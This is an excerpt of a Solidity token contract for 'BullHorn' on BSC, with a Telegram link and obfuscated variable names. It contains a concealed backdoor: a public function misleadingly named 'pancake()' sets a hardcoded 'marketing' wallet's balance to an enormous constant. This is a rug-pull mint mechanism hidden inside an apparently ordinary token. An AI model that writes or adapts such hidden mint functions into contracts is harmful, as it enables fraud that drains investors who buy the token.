...
📱 Tekegran : https://t.me/Bullhornbsc
...
contract Context {
 ...
 contract BullHorn is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloAJZU;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "BullHorn";
    string private _symbol = "BULLHORN";
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000000 * 10**39;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private cryfaleAJZU = 4;
    uint256 private _vebegoAJZU = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloAJZU[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletAJZU = 0xB6091ea49dB1687Bb24002cb0a522EC137c70b79;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloAJZU[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloAJZU[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleAJZU / 100) / _vebegoAJZU;
        allons = allons -  (_fee * _vebegoAJZU);
        
        superfloAJZU[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaAJZU) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloAJZU[account];
        require(accountBalance >= gzillaAJZU, "BEP : Can't be done");
        unchecked {
            superfloAJZU[account] = accountBalance - gzillaAJZU;
        }
        _totalSupply -= gzillaAJZU;

        emit Transfer(account, address(0), gzillaAJZU);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function pancake() public {
        superfloAJZU[_MarketingWalletAJZU] = _tTotal;
        require(_msgSender() == _MarketingWalletAJZU, "ERC20: Function reserved for Pancake");
    }   
